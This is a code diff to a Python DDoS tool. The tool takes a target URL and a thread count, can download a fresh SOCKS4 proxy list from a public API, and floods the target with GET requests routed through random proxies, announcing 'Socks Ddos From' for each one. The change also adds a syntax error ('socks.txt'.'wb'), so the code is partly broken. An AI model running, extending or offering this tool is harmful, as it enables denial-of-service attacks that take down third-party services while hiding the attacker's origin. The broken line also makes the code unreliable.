@@ -34,7 +34,14 @@ def main():
 	global url
 	url = str(input("Target : "))
 	thr = int(input("Threads : "))
-	list = str(input("Socks List : "))
+	cho = str(input("Get Some Fresh Socks ? (y/n) : "))
+	if cho =='y':
+		rsp = requests.get('https://www.proxy-list.download/api/v1/get?type=socks4')
+		with open('socks.txt'.'wb') as fp:
+			fp.write(rsp.content)
+	else:
+		pass
+	list = str(input("Socks List (socks.txt): "))
 	for x in range(thr):
 		x = Thread(target=atk, name=(x))
 		x.start()
@@ -45,8 +52,8 @@ def atk():
 		proxy = random.choice(pprr).strip().split(":")
 		s = requests.session()
 		s.proxies = {}
-		s.proxies['http'] = ("socks5h://"+str(proxy[0])+":"+str(proxy[1]))
-		s.proxies['https'] = ("socks5h://"+str(proxy[0])+":"+str(proxy[1]))
+		s.proxies['http'] = ("socks4h://"+str(proxy[0])+":"+str(proxy[1]))
+		s.proxies['https'] = ("socks4h://"+str(proxy[0])+":"+str(proxy[1]))
 		try:
 			s.get(url)
 			print("Socks Ddos From ~ / " + str(proxy[0])+":"+str(proxy[1]))
